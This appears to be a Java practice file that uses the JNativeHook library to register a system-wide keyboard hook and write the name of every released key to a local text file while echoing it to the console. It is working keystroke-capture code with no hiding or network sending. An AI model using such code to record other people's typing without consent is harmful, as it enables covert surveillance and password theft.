package utils;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class InputListener {
    private static File file = new File("D:\\practice\\java-practice\\utils\\captured.txt");
    private static FileWriter writer;
    private static BufferedWriter bufferedWriter;
    static {
        try {
            writer = new FileWriter(file);
            bufferedWriter = new BufferedWriter(writer);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws IOException {
        try
        {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new NativeKeyListener()
            {

                @Override
                public void nativeKeyTyped(NativeKeyEvent nativeEvent)
                {
                }

                @Override
                public void nativeKeyReleased(NativeKeyEvent nativeEvent)
                {
                    String keyText=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
                    try {
                        bufferedWriter.write(keyText);
                        System.out.println("keyText = " + keyText);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                @Override
                public void nativeKeyPressed(NativeKeyEvent nativeEvent)
                {
                }
            });
        }
        catch (NativeHookException e)
        {
            e.printStackTrace();
        }
    }
}
